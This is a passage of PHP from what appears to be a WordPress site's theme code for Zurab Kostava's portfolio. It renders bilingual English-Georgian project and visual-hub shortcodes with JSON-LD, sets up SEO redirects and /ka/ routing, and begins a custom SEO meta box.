        $excerpt_en = get_the_excerpt() ?: wp_trim_words( get_the_content(), 35 );
        $excerpt_ka = get_post_meta( $post_id, '_zk_excerpt_ka', true ) ?: get_post_meta( $post_id, '_zk_content_ka', true );
        
        // Smart fallbacks for existing projects if KA translation is not yet saved in DB
        if ( empty( $excerpt_ka ) && $is_ka ) {
            $t_lower = strtolower( trim( $title_en ) );
            if ( strpos( $t_lower, 'wordevo' ) !== false ) {
                $excerpt_ka = 'მრავალმხრივი, მრავალენოვანი სიტყვების შემსწავლელი სისტემა, სადაც შეგიძლიათ შექმნათ პერსონალიზებული სიტყვების ბიბლიოთეკები და პრაქტიკული მეთოდებით დაიმახსოვროთ ისინი. აპლიკაცია აღჭურვილია უნიკალური boost სისტემით, რომელიც ყოველი მცირე ინტერაქციისა და აქტივობისას ზრდის თქვენს პროგრესს.';
            } elseif ( strpos( $t_lower, 'kostava' ) !== false ) {
                $excerpt_ka = 'ჩემი და ჩემი ძმის, ჯონ კოსტავას მიერ დაფუძნებული ინიციატივა, რომელიც ეძღვნება უნიკალური ქართული საკრავებისა და პოლიფონიის გაციფრულებას. ჩვენი მიზანია შევქმნათ აუდიო და მულტიმედია კომპანია, რომელიც ნამდვილ შემოქმედებს ახალი თაობის ინსტრუმენტებს შესთავაზებს.';
            } elseif ( strpos( $t_lower, 'encrolib' ) !== false ) {
                $excerpt_ka = 'ვიზუალური ენა, სადაც სიტყვები ფერებადაა კოდირებული და თითოეული ფერი შეესაბამება ერთ სიტყვას. პლატფორმა იყენებს Hex ფერთა კოდებს კონკრეტული ფერის შესაბამის სიტყვად და პირიქით შეუფერხებლად გადასათარგმნად.';
            }
        }
        $excerpt   = ( $is_ka && ! empty( $excerpt_ka ) ) ? $excerpt_ka : $excerpt_en;

        $link_en   = zk_normalize_internal_destination( get_post_meta( $post_id, '_zk_tool_link', true ) );
        $link_ka   = zk_normalize_internal_destination( get_post_meta( $post_id, '_zk_tool_link_ka', true ) );
        if ( $is_ka ) {
            if ( ! empty( $link_ka ) ) {
                $link = $link_ka;
            } elseif ( ! empty( $link_en ) ) {
                $parsed = parse_url( $link_en );
                $path = isset( $parsed['path'] ) ? $parsed['path'] : '';
                if ( strpos( $path, '/projects/' ) !== false && strpos( $path, '/ka/projects/' ) === false ) {
                    $ka_path = str_replace( '/projects/', '/ka/projects/', $path );
                    if ( isset( $parsed['scheme'] ) && isset( $parsed['host'] ) ) {
                        $link = $parsed['scheme'] . '://' . $parsed['host'] . $ka_path;
                    } else {
                        $link = $ka_path;
                    }
                } else {
                    $link = $link_en;
                }
            } else {
                $link = '';
            }
        } else {
            $link = $link_en;
        }

        $project_language = zk_get_current_language();
        if ( 'en' !== $project_language ) {
            $title = get_post_meta( $post_id, '_zk_title_' . $project_language, true ) ?: $title;
            $excerpt = get_post_meta( $post_id, '_zk_excerpt_' . $project_language, true ) ?: get_post_meta( $post_id, '_zk_content_' . $project_language, true ) ?: $excerpt;
        }
        $link = zk_project_url( $post_id, $project_language ) ?: $link;
        $status_en    = get_post_meta( $post_id, '_zk_tool_status', true ) ?: 'Live';
        $status_ka    = get_post_meta( $post_id, '_zk_tool_status_ka', true );
        if ( $is_ka ) {
            if ( ! empty( $status_ka ) ) {
                $status_display = $status_ka;
            } else {
                $status_map = array(
                    'Live'     => 'აქტიური',
                    'Beta'     => 'ბეტა',
                    'WIP'      => 'მუშავდება',
                    'Archived' => 'არქივი'
                );
                $status_display = isset( $status_map[$status_en] ) ? $status_map[$status_en] : $status_en;
            }
            if ( function_exists( 'zk_uppercase_ka' ) ) {
                $status_display = zk_uppercase_ka( $status_display );
            }
        } else {
            $status_display = $status_en;
        }

        $btn_label_en = get_post_meta( $post_id, '_zk_tool_btn_label', true ) ?: 'Visit Project';
        $btn_label_ka = get_post_meta( $post_id, '_zk_tool_btn_label_ka', true ) ?: 'პროექტის ნახვა';
        $btn_label    = $is_ka ? ( function_exists( 'zk_uppercase_ka' ) ? zk_uppercase_ka( $btn_label_ka ) : $btn_label_ka ) : $btn_label_en;

        $thumb_url    = get_the_post_thumbnail_url( $post_id, 'large' );
        $card_tag     = $link ? 'a' : 'div';
        $href         = $link ? ' href="' . esc_url( $link ) . '" target="_blank" rel="noopener"' : '';
        $status_class = strtolower( str_replace( ' ', '-', $status_en ) );

        // Describe portfolio entries as creative projects. Some are software,
        // but not every project is an installable app with public reviews;
        // marking all of them as SoftwareApplication creates invalid Google
        // rich-result requirements for ratings/reviews.
        $schema_items[] = array(
            '@type' => 'ListItem',
            'position' => $pos,
            'item' => array(
                '@type' => 'CreativeWork',
                'inLanguage' => $is_ka ? 'ka-GE' : 'en-US',
                'name' => wp_strip_all_tags( $title ),
                'description' => wp_strip_all_tags( $excerpt ),
                'url' => $link ? $link : get_permalink( $post_id ),
                'creator' => array(
                    '@type' => 'Person',
                    '@id'   => home_url( '/#person' ),
                    'name'  => 'Zurab Kostava',
                ),
            )
        );
        $pos++;

        $output .= '<' . $card_tag . $href . ' class="zk-tool-card">';
        
        if ( $thumb_url ) {
            $output .= '<div class="zk-tool-image">' . wp_get_attachment_image( get_post_thumbnail_id( $post_id ), 'large', false, array(
                'loading' => 'lazy',
                'decoding' => 'async',
                'sizes' => '(max-width: 700px) 100vw, (max-width: 1050px) 50vw, 440px',
            ) ) . '</div>';
        } else {
            $output .= '<div class="zk-tool-image zk-tool-image-empty"></div>';
        }

        $output .= '<div class="zk-tool-content">';
        $output .= '<div class="zk-tool-header">';
        $output .= '<h2 class="zk-tool-title">' . esc_html( $title ) . '</h2>';
        $output .= '<span class="zk-tool-status status-' . esc_attr( $status_class ) . '">' . esc_html( $status_display ) . '</span>';
        $output .= '</div>';
        
        if ( $excerpt ) {
            $output .= '<p class="zk-tool-excerpt">' . esc_html( $excerpt ) . '</p>';
        }

        if ( $link ) {
            $output .= '<div class="zk-tool-footer"><span class="zk-tool-link-text">' . esc_html( $btn_label ) . '</span><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M5 12h14M12 5l7 7-7 7"/></svg></div>';
        }

        $output .= '</div>';
        $output .= '</' . $card_tag . '>';
    }

    wp_reset_postdata();
    $output .= '</div>';

    if ( ! empty( $schema_items ) ) {
        $graph = array(
            '@context' => 'https://schema.org',
            '@type' => 'ItemList',
            'itemListElement' => $schema_items
        );
        $output .= "\n" . '<script type="application/ld+json">' . "\n";
        $output .= json_encode( $graph, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES | JSON_PRETTY_PRINT );
        $output .= "\n" . '</script>' . "\n";
    }

    return $output;
}
add_shortcode( 'zk_tools', 'zk_tools_shortcode' );

// Auto-seed initial Georgian translations for existing tools (Wordevo, Kostava Creative, Encrolib)
function zk_init_tools_ka_translations() {
    $seeded = get_option( 'zk_tools_seeded_ka_v1', false );
    if ( $seeded ) return;

    $tools = get_posts( array(
        'post_type'      => 'zk_tool',
        'posts_per_page' => -1,
        'post_status'    => 'any',
    ) );

    if ( ! empty( $tools ) ) {
        foreach ( $tools as $tool ) {
            $id = $tool->ID;
            $t = $tool->post_title;
            $t_lower = strtolower( trim( $t ) );

            if ( ! get_post_meta( $id, '_zk_tool_btn_label_ka', true ) ) {
                update_post_meta( $id, '_zk_tool_btn_label_ka', 'პროექტის ნახვა' );
            }

            if ( strpos( $t_lower, 'wordevo' ) !== false ) {
                if ( ! get_post_meta( $id, '_zk_title_ka', true ) ) {
                    update_post_meta( $id, '_zk_title_ka', 'Wordevo' );
                }
                if ( ! get_post_meta( $id, '_zk_tool_status_ka', true ) ) {
                    update_post_meta( $id, '_zk_tool_status_ka', 'ბეტა' );
                }
                if ( ! get_post_meta( $id, '_zk_excerpt_ka', true ) ) {
                    update_post_meta( $id, '_zk_excerpt_ka', 'მრავალმხრივი, მრავალენოვანი სიტყვების შემსწავლელი სისტემა, სადაც შეგიძლიათ შექმნათ პერსონალიზებული სიტყვების ბიბლიოთეკები და პრაქტიკული მეთოდებით დაიმახსოვროთ ისინი. აპლიკაცია აღჭურვილია უნიკალური boost სისტემით, რომელიც ყოველი მცირე ინტერაქციისა და აქტივობისას ზრდის თქვენს პროგრესს.' );
                }
            } elseif ( strpos( $t_lower, 'kostava' ) !== false ) {
                if ( ! get_post_meta( $id, '_zk_title_ka', true ) ) {
                    update_post_meta( $id, '_zk_title_ka', 'Kostava Creative' );
                }
                if ( ! get_post_meta( $id, '_zk_tool_status_ka', true ) ) {
                    update_post_meta( $id, '_zk_tool_status_ka', 'მუშავდება' );
                }
                if ( ! get_post_meta( $id, '_zk_excerpt_ka', true ) ) {
                    update_post_meta( $id, '_zk_excerpt_ka', 'ჩემი და ჩემი ძმის, ჯონ კოსტავას მიერ დაფუძნებული ინიციატივა, რომელიც ეძღვნება უნიკალური ქართული საკრავებისა და პოლიფონიის გაციფრულებას. ჩვენი მიზანია შევქმნათ აუდიო და მულტიმედია კომპანია, რომელიც ნამდვილ შემოქმედებს ახალი თაობის ინსტრუმენტებს შესთავაზებს.' );
                }
            } elseif ( strpos( $t_lower, 'encrolib' ) !== false ) {
                if ( ! get_post_meta( $id, '_zk_title_ka', true ) ) {
                    update_post_meta( $id, '_zk_title_ka', 'Encrolib' );
                }
                if ( ! get_post_meta( $id, '_zk_tool_status_ka', true ) ) {
                    update_post_meta( $id, '_zk_tool_status_ka', 'ბეტა' );
                }
                if ( ! get_post_meta( $id, '_zk_excerpt_ka', true ) ) {
                    update_post_meta( $id, '_zk_excerpt_ka', 'ვიზუალური ენა, სადაც სიტყვები ფერებადაა კოდირებული და თითოეული ფერი შეესაბამება ერთ სიტყვას. პლატფორმა იყენებს Hex ფერთა კოდებს კონკრეტული ფერის შესაბამის სიტყვად და პირიქით შეუფერხებლად გადასათარგმნად.' );
                }
            }
        }
        update_option( 'zk_tools_seeded_ka_v1', true );
    }
}
add_action( 'init', 'zk_init_tools_ka_translations' );


/* ============================================================
   VISUAL HUB
   ============================================================ */
function zk_visual_hub_shortcode() {
    $is_ka    = function_exists( 'zk_get_current_language' ) && zk_get_current_language() === 'ka';
    $settings = function_exists( 'zk_visual_hub_get_settings' ) ? zk_visual_hub_get_settings() : array();
    $intro    = isset( $settings['intro'] ) ? $settings['intro'] : array();
    $cards    = isset( $settings['cards'] ) ? $settings['cards'] : array();

    $badge_text = $is_ka ? ( ! empty( $intro['badge_ka'] ) ? $intro['badge_ka'] : ( isset( $intro['badge_en'] ) ? $intro['badge_en'] : '' ) ) : ( isset( $intro['badge_en'] ) ? $intro['badge_en'] : '' );
    if ( $is_ka && function_exists( 'zk_uppercase_ka' ) && ! empty( $badge_text ) ) {
        $badge_text = zk_uppercase_ka( $badge_text );
    }
    $intro_text = $is_ka ? ( ! empty( $intro['intro_ka'] ) ? $intro['intro_ka'] : ( isset( $intro['intro_en'] ) ? $intro['intro_en'] : '' ) ) : ( isset( $intro['intro_en'] ) ? $intro['intro_en'] : '' );

    $output = '';

    // Guaranteed inline styles (eliminates any CDN/browser stylesheet caching issues)
    $output .= '<style id="zk-visual-hub-styles">
.zk-visual-hub {
    display: grid !important;
    grid-template-columns: repeat(2, minmax(0, 1fr)) !important;
    gap: 36px !important;
    margin-top: 1.5rem !important;
    margin-bottom: 3.5rem !important;
}
@media (max-width: 860px) {
    .zk-visual-hub {
        grid-template-columns: 1fr !important;
        gap: 28px !important;
    }
}
.zk-visual-item {
    position: relative !important;
    display: flex !important;
    flex-direction: column !important;
    border-radius: 24px !important;
}
/* Natural, Organic, Diffused Atmospheric Halo */
.zk-visual-halo {
    position: absolute !important;
    inset: -55px -65px !important;
    border-radius: 64px !important;
    background: radial-gradient(
        ellipse 85% 75% at 50% 50%,
        rgba(var(--card-accent-rgb, 99, 102, 241), 0.52) 0%,
        rgba(var(--card-accent-rgb, 99, 102, 241), 0.28) 32%,
        rgba(var(--card-accent-rgb, 99, 102, 241), 0.10) 58%,
        rgba(var(--card-accent-rgb, 99, 102, 241), 0.02) 75%,
        transparent 88%
    ) !important;
    filter: blur(65px) !important;
    -webkit-filter: blur(65px) !important;
    opacity: 0.2 !important;
    transform: translate3d(0, 0, 0) scale(0.92) !important;
    will-change: transform, opacity !important;
    transition: opacity 0.6s cubic-bezier(0.16, 1, 0.3, 1),
                transform 0.6s cubic-bezier(0.16, 1, 0.3, 1) !important;
    pointer-events: none !important;
    z-index: 0 !important;
}
.zk-visual-item:hover .zk-visual-halo {
    opacity: 0.88 !important;
    transform: translate3d(0, -10px, 0) scale(1.12) !important;
}

/* Card Container */
.zk-visual-card {
    position: relative !important;
    z-index: 1 !important;
    width: 100% !important;
    flex: 1 !important;
    border-radius: 24px !important;
    overflow: hidden !important;
    min-height: 380px !important;
    display: flex !important;
    flex-direction: column !important;
    justify-content: flex-end !important;
    text-decoration: none !important;
    background: #090c13 !important;
    border: 1px solid rgba(255, 255, 255, 0.09) !important;
    transform: translate3d(0, 0, 0) !important;
    will-change: transform, box-shadow, border-color !important;
    transition: transform 0.55s cubic-bezier(0.16, 1, 0.3, 1),
                border-color 0.55s cubic-bezier(0.16, 1, 0.3, 1),
                box-shadow 0.55s cubic-bezier(0.16, 1, 0.3, 1) !important;
    box-shadow: 0 10px 30px -10px rgba(0, 0, 0, 0.5) !important;
}
@media (max-width: 768px) {
    .zk-visual-card {
        min-height: 290px !important;
        border-radius: 20px !important;
    }
}
.zk-visual-item:hover .zk-visual-card,
.zk-visual-card:hover {
    transform: translate3d(0, -10px, 0) !important;
    border-color: rgba(255, 255, 255, 0.28) !important;
    box-shadow: 0 30px 65px -15px rgba(0, 0, 0, 0.85) !important;
    transition: transform 0.55s cubic-bezier(0.16, 1, 0.3, 1),
                border-color 0.55s cubic-bezier(0.16, 1, 0.3, 1),
                box-shadow 0.55s cubic-bezier(0.16, 1, 0.3, 1) !important;
}

/* Inner Background Image Layer */
.zk-visual-bg {
    position: absolute !important;
    inset: 0 !important;
    background-size: cover !important;
    background-position: center !important;
    transform: scale(1) !important;
    filter: brightness(0.65) saturate(1.1) !important;
    will-change: transform, filter !important;
    transition: transform 0.7s cubic-bezier(0.16, 1, 0.3, 1),
                filter 0.7s cubic-bezier(0.16, 1, 0.3, 1) !important;
    z-index: 1 !important;
}
.zk-visual-item:hover .zk-visual-bg,
.zk-visual-card:hover .zk-visual-bg {
    transform: scale(1.06) !important;
    filter: brightness(0.85) saturate(1.22) !important;
}

/* Inner Aura */
.zk-visual-aura {
    position: absolute !important;
    inset: 0 !important;
    background: radial-gradient(circle at 80% 20%, rgba(var(--card-accent-rgb, 99, 102, 241), 0.35) 0%, transparent 65%) !important;
    opacity: 0.2 !important;
    will-change: opacity !important;
    transition: opacity 0.55s cubic-bezier(0.16, 1, 0.3, 1) !important;
    z-index: 2 !important;
    pointer-events: none !important;
}
.zk-visual-item:hover .zk-visual-aura,
.zk-visual-card:hover .zk-visual-aura {
    opacity: 0.52 !important;
}

/* Typography Hover */
.zk-visual-title {
    font-size: clamp(1.65rem, 2.3vw, 2.15rem) !important;
    font-weight: 600 !important;
    color: #ffffff !important;
    margin: 0 0 8px 0 !important;
    line-height: 1.15 !important;
    letter-spacing: -0.025em !important;
    transform: translate3d(0, 0, 0) !important;
    transition: transform 0.5s cubic-bezier(0.16, 1, 0.3, 1), color 0.4s ease !important;
}
.zk-visual-item:hover .zk-visual-title,
.zk-visual-card:hover .zk-visual-title {
    transform: translate3d(0, -2px, 0) !important;
}
.zk-visual-desc {
    font-size: 0.92rem !important;
    line-height: 1.55 !important;
    color: rgba(255, 255, 255, 0.72) !important;
    margin: 0 !important;
    font-weight: 400 !important;
    letter-spacing: 0.01em !important;
    opacity: 1 !important;
    transform: translate3d(0, 0, 0) !important;
    transition: transform 0.5s cubic-bezier(0.16, 1, 0.3, 1), color 0.3s ease !important;
}
.zk-visual-item:hover .zk-visual-desc,
.zk-visual-card:hover .zk-visual-desc {
    transform: translate3d(0, -1px, 0) !important;
    color: rgba(255, 255, 255, 0.96) !important;
}

/* Arrow & Action */
.zk-visual-badge,
.zk-visual-hub-badge {
    text-transform: uppercase !important;
    font-feature-settings: "case" 1 !important;
    letter-spacing: 0.08em !important;
}
.zk-visual-title,
.zk-visual-desc,
.zk-visual-action-label,
.zk-visual-badge,
.zk-visual-hub-badge {
    font-family: var(--font) !important;
}
.zk-visual-action-label {
    font-size: 0.82rem !important;
    font-weight: 600 !important;
    text-transform: uppercase !important;
    font-feature-settings: "case" 1 !important;
    letter-spacing: 0.08em !important;
    color: rgba(255, 255, 255, 0.6) !important;
    opacity: 0 !important;
    transform: translate3d(8px, 0, 0) !important;
    transition: opacity 0.45s cubic-bezier(0.16, 1, 0.3, 1),
                transform 0.45s cubic-bezier(0.16, 1, 0.3, 1) !important;
}
.zk-visual-item:hover .zk-visual-action-label,
.zk-visual-card:hover .zk-visual-action-label {
    opacity: 1 !important;
    transform: translate3d(0, 0, 0) !important;
}

.zk-visual-arrow {
    width: 44px !important;
    height: 44px !important;
    border-radius: 50% !important;
    background: rgba(255, 255, 255, 0.08) !important;
    -webkit-backdrop-filter: blur(10px) !important;
    backdrop-filter: blur(10px) !important;
    border: 1px solid rgba(255, 255, 255, 0.15) !important;
    display: flex !important;
    align-items: center !important;
    justify-content: center !important;
    color: #ffffff !important;
    transform: scale(1) !important;
    transition: transform 0.45s cubic-bezier(0.16, 1, 0.3, 1),
                background 0.4s ease,
                border-color 0.4s ease,
                box-shadow 0.4s ease,
                color 0.4s ease !important;
}
.zk-visual-arrow svg {
    width: 18px !important;
    height: 18px !important;
    transform: translate3d(0, 0, 0) !important;
    transition: transform 0.35s ease !important;
}
.zk-visual-item:hover .zk-visual-arrow,
.zk-visual-card:hover .zk-visual-arrow {
    background: var(--card-accent, #ffffff) !important;
    border-color: transparent !important;
    color: #08090d !important;
    transform: scale(1.08) !important;
    box-shadow: 0 0 25px var(--card-accent, rgba(255, 255, 255, 0.45)) !important;
}
.zk-visual-item:hover .zk-visual-arrow svg,
.zk-visual-card:hover .zk-visual-arrow svg {
    transform: translate3d(2px, 0, 0) !important;
}

/* Ensure smooth animations even if OS reduced motion is active */
@media (prefers-reduced-motion: reduce) {
    .zk-visual-card,
    .zk-visual-halo,
    .zk-visual-bg,
    .zk-visual-aura,
    .zk-visual-arrow,
    .zk-visual-title,
    .zk-visual-desc,
    .zk-visual-action-label {
        transition-duration: 0.55s !important;
    }
}
</style>';

    // Optional Intro Lead Header
    if ( ! empty( $intro_text ) || ! empty( $badge_text ) ) {
        $output .= '<div class="zk-visual-hub-intro">';
        if ( ! empty( $badge_text ) ) {
            $output .= '<span class="zk-visual-hub-badge"><span class="zk-pulse-dot" aria-hidden="true"></span> ' . esc_html( $badge_text ) . '</span>';
        }
        if ( ! empty( $intro_text ) ) {
            $output .= '<p class="zk-visual-hub-lead">' . esc_html( $intro_text ) . '</p>';
        }
        $output .= '</div>';
    }

    $output .= '<div class="zk-visual-hub" role="region" aria-label="' . esc_attr( $is_ka ? 'ვიზუალური მიმართულებები' : 'Visual Disciplines' ) . '">';

    $schema_items = array();
    $index = 0;

    foreach ( $cards as $key => $card ) {
        $index++;
        $title = $is_ka ? ( ! empty( $card['title_ka'] ) ? $card['title_ka'] : $card['title_en'] ) : $card['title_en'];
        $badge = $is_ka ? ( ! empty( $card['badge_ka'] ) ? $card['badge_ka'] : $card['badge_en'] ) : $card['badge_en'];
        $desc  = $is_ka ? ( ! empty( $card['desc_ka'] ) ? $card['desc_ka'] : $card['desc_en'] ) : $card['desc_en'];
        $link  = $is_ka ? ( ! empty( $card['link_ka'] ) ? $card['link_ka'] : $card['link_en'] ) : $card['link_en'];

        // Normalize full URL
        if ( strpos( $link, 'http://' ) !== 0 && strpos( $link, 'https://' ) !== 0 ) {
            $full_url = home_url( '/' . ltrim( $link, '/' ) );
        } else {
            $full_url = $link;
        }

        // SPA route
        $parsed_route = parse_url( $full_url, PHP_URL_PATH );
        $spa_route    = ! empty( $parsed_route ) ? $parsed_route : $link;

        $accent_color = ! empty( $card['accent_color'] ) ? $card['accent_color'] : '#6366f1';
        $accent_rgb   = function_exists( 'zk_hex2rgb' ) ? zk_hex2rgb( $accent_color ) : '99, 102, 241';
        $image_url    = ! empty( $card['image_url'] ) ? $card['image_url'] : '';
        $bg_style     = ! empty( $image_url ) ? 'style="background-image: url(\'' . esc_url( $image_url ) . '\');"' : '';
        $action_label = $is_ka ? ( function_exists( 'zk_uppercase_ka' ) ? zk_uppercase_ka( 'ნახვა' ) : 'ნახვა' ) : 'Explore';
        $badge_display = ( $is_ka && function_exists( 'zk_uppercase_ka' ) ) ? zk_uppercase_ka( $badge ) : $badge;

        $output .= '<div class="zk-visual-item" style="--card-accent: ' . esc_attr( $accent_color ) . '; --card-accent-rgb: ' . esc_attr( $accent_rgb ) . ';">';

        // Natural, Diffused Halo element
        $output .= '<div class="zk-visual-halo" aria-hidden="true"></div>';

        $output .= '<a href="' . esc_url( $full_url ) . '" ';
        $output .= 'data-route="' . esc_attr( $spa_route ) . '" ';
        $output .= 'class="zk-visual-card ' . esc_attr( $card['class'] ) . '" ';
        $output .= 'aria-label="' . esc_attr( $title . ' — ' . $badge ) . '">';

        // Ambient Aura
        $output .= '<div class="zk-visual-aura" aria-hidden="true"></div>';

        // Background Image Layer
        $output .= '<div class="zk-visual-bg" ' . $bg_style . '></div>';

        // Cinematic Scrim
        $output .= '<div class="zk-visual-scrim" aria-hidden="true"></div>';

        // Inner Content
        $output .= '<div class="zk-visual-inner">';

        // Top Row (Badge + Index)
        $output .= '<div class="zk-visual-top">';
        $output .= '<span class="zk-visual-badge">';
        $output .= '<span class="zk-visual-dot" style="background-color: ' . esc_attr( $accent_color ) . ';" aria-hidden="true"></span>';
        $output .= esc_html( $badge_display );
        $output .= '</span>';
        $output .= '<span class="zk-visual-index" aria-hidden="true">' . sprintf( '%02d', $index ) . '</span>';
        $output .= '</div>';

        // Bottom Row (Title, Desc, Action Button)
        $output .= '<div class="zk-visual-bottom">';
        $output .= '<div class="zk-visual-text">';
        $output .= '<h2 class="zk-visual-title">' . esc_html( $title ) . '</h2>';
        $output .= '<p class="zk-visual-desc">' . esc_html( $desc ) . '</p>';
        $output .= '</div>';

        $output .= '<div class="zk-visual-action" aria-hidden="true">';
        $output .= '<span class="zk-visual-action-label">' . esc_html( $action_label ) . '</span>';
        $output .= '<span class="zk-visual-arrow">';
        $output .= '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">';
        $output .= '<line x1="5" y1="12" x2="19" y2="12"></line>';
        $output .= '<polyline points="12 5 19 12 12 19"></polyline>';
        $output .= '</svg>';
        $output .= '</span>';
        $output .= '</div>';

        $output .= '</div>'; // .zk-visual-bottom
        $output .= '</div>'; // .zk-visual-inner

        $output .= '</a>';
        $output .= '</div>'; // .zk-visual-item

        $schema_items[] = array(
            '@type'       => 'CreativeWork',
            'position'    => $index,
            'name'        => $title,
            'headline'    => $badge,
            'description' => $desc,
            'url'         => $full_url,
            'image'       => $image_url,
        );
    }

    $output .= '</div>'; // .zk-visual-hub

    // Structured Data JSON-LD
    if ( ! empty( $schema_items ) ) {
        $schema = array(
            '@context'        => 'https://schema.org',
            '@type'           => 'ItemList',
            'name'            => $is_ka ? 'ვიზუალური ხელოვნების მიმართულებები' : 'Visual Disciplines & Portfolio',
            'itemListElement' => $schema_items,
        );
        $output .= '<script type="application/ld+json">' . wp_json_encode( $schema, JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE ) . '</script>';
    }

    return $output;
}
add_shortcode( 'zk_visual_hub', 'zk_visual_hub_shortcode' );

/* ============================================================
   CUSTOM SEO REDIRECTS (Site Architecture Migration)
   ============================================================ */
function zk_custom_seo_redirects() {
    // Execute extremely fast, bail if in WP admin panel
    if ( is_admin() ) {
        return;
    }

    $request_uri = $_SERVER['REQUEST_URI'];
    // Convert path to lowercase to match exactly regardless of casing (e.g. /Nocturnes/)
    $path = strtolower( rtrim( parse_url( $request_uri, PHP_URL_PATH ), '/' ) );

    // Strip /ka prefix for exact matches and dynamic routes to avoid double redirects
    if ( strpos( $path, '/ka/' ) === 0 || $path === '/ka' ) {
        $clean_path = substr( $path, 3 );
        if ( $clean_path === false || $clean_path === '' ) {
            $clean_path = '/';
        }
    } else {
        $clean_path = $path;
    }

    // 1. EXACT MATCH REDIRECTS
    $exact_matches = array(
        '/aubades'     => '/blog/raw/aubades/',
        '/nocturnes'   => '/blog/raw/nocturnes/',
        '/gallery'     => '/about/',
        '/photography' => '/visual/photography/',
        '/video'       => '/visual/video/',
        '/graphic'     => '/visual/graphic/',
        '/paint'       => '/visual/paint/'
    );

    if ( array_key_exists( $clean_path, $exact_matches ) ) {
        wp_redirect( home_url( $exact_matches[ $clean_path ] ), 301 );
        exit;
    }

    // 2. DYNAMIC REGEX REDIRECTS
    if ( preg_match( '#^/nocturne-([^/]+)$#', $clean_path, $matches ) ) {
        wp_redirect( home_url( '/blog/raw/nocturnes/nocturne-' . $matches[1] . '/' ), 301 );
        exit;
    }

    if ( preg_match( '#^/aubade-([^/]+)$#', $clean_path, $matches ) ) {
        wp_redirect( home_url( '/blog/raw/aubades/aubade-' . $matches[1] . '/' ), 301 );
        exit;
    }

    // 3. GLOBAL /ka/ FALLBACK (Except for books)
    // Commented out to allow true multilingual routing via language-manager.php
    /*
    if ( ( strpos( $path, '/ka/' ) === 0 || $path === '/ka' ) && strpos( $path, '/ka/books' ) !== 0 ) {
        // We replace ^/ka at the start of $request_uri so we preserve query params
        $new_uri = preg_replace( '#^/ka(?=/|$)#', '', $request_uri );
        if ( $new_uri === '' ) {
            $new_uri = '/';
        }
        wp_redirect( home_url( $new_uri ), 301 );
        exit;
    }
    */
}
// Using 'init' instead of 'template_redirect' so it fires before WP query and 404 logic
add_action( 'init', 'zk_custom_seo_redirects' );

// Fix 404 for /ka/books/, /ka/projects/, and /ka/visual/ by manually setting the pagename
add_action( 'parse_request', function( $wp ) {
    $request_uri = isset($_SERVER['REQUEST_URI']) ? $_SERVER['REQUEST_URI'] : '';
    $path = parse_url( $request_uri, PHP_URL_PATH );
    if ( preg_match( '#^/ka/(books|projects|visual)(/.*)?$#', $path ) ) {
        // Strip /ka/ to get the real page path
        $real_path = preg_replace( '#^/ka/#', '', $path );
        $real_path = trim( $real_path, '/' );
        $wp->query_vars['pagename'] = $real_path;
        $wp->query_vars['error'] = ''; // clear 404 flag if any
    }
} );

/* ============================================================
   ZK CUSTOM SEO ENGINE (Stage 1)
   ============================================================ */

function zk_localized_meta_key( $field, $language = 'en' ) {
    return 'en' === $language ? '_zk_' . sanitize_key( $field ) : zk_language_meta_key( $field, $language );
}

/**
 * Reject values that clearly are not browser/search-result titles.
 *
 * This keeps an accidentally pasted FAQ or other long-form field from taking
 * over the document title while preserving normal custom SEO titles.
 */
function zk_validate_seo_title_value( $value ) {
    $value  = trim( wp_strip_all_tags( (string) $value ) );
    $length = function_exists( 'mb_strlen' ) ? mb_strlen( $value ) : strlen( $value );

    if ( $length > 180 || preg_match( '/(?:^|\s)Q:\s.+(?:^|\s)A:\s/is', $value ) ) {
        return '';
    }

    return $value;
}

function zk_get_localized_post_meta( $post_id, $field, $language = '', $fallback_to_english = false ) {
    $language = $language ?: ( function_exists( 'zk_get_current_language' ) ? zk_get_current_language() : 'en' );
    $value = get_post_meta( $post_id, zk_localized_meta_key( $field, $language ), true );
    if ( $fallback_to_english && 'en' !== $language && '' === trim( (string) $value ) ) {
        $value = get_post_meta( $post_id, zk_localized_meta_key( $field, 'en' ), true );
    }
    if ( 'seo_title' === $field ) {
        $value = zk_validate_seo_title_value( $value );
    }
    return $value;
}

function zk_get_localized_term_meta( $term_id, $field, $language = '', $fallback_to_english = false ) {
    $language = $language ?: ( function_exists( 'zk_get_current_language' ) ? zk_get_current_language() : 'en' );
    $value = get_term_meta( $term_id, zk_localized_meta_key( $field, $language ), true );
    if ( $fallback_to_english && 'en' !== $language && '' === trim( (string) $value ) ) {
        $value = get_term_meta( $term_id, zk_localized_meta_key( $field, 'en' ), true );
    }
    if ( 'seo_title' === $field ) {
        $value = zk_validate_seo_title_value( $value );
    }
    return $value;
}

// 1. Add Custom Meta Box
function zk_seo_add_meta_box() {
    $screens = array( 'post', 'page', 'zk_book', 'zk_tool' );
    foreach ( $screens as $screen ) {
        add_meta_box(
            'zk_seo_meta_box',           // Unique ID
            'ZK Custom SEO Settings',     // Box title
            'zk_seo_meta_box_html',      // Content callback
            $screen,                     // Post type
            'normal',                    // Context
            'high'                       // Priority
        );
    }
}
add_action( 'add_meta_boxes', 'zk_seo_add_meta_box' );

function zk_seo_meta_box_html( $post ) {
    wp_nonce_field( 'zk_seo_save_meta', 'zk_seo_meta_nonce' );
    ?>
    <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 20px; padding: 10px 0;">
        <?php
        $languages = zk_get_languages( false );
        foreach ( $languages as $code => $language ) :
            $seo_title = zk_get_localized_post_meta( $post->ID, 'seo_title', $code );
            $seo_desc  = zk_get_localized_post_meta( $post->ID, 'seo_description', $code );
            $is_source = 'en' === $code;
            $field_suffix = $is_source ? '' : '_' . $code;
        ?>
        <div style="background: #f8f9fa; border: 1px solid #dcdcde; border-radius: 6px; padding: 15px;">
            <h4 style="margin: 0 0 12px; font-size: 15px; display: flex; align-items: center; gap: 8px;">
                <?php echo esc_html( $language['native_name'] . ' SEO Settings (' . strtoupper( $code ) . ')' ); ?>
            </h4>
            <label for="zk_seo_title<?php echo esc_attr( $field_suffix ); ?>" style="display:block; font-weight:600; margin-bottom:5px;">SEO Title (<?php echo esc_html( strtoupper( $code ) ); ?>)</label>
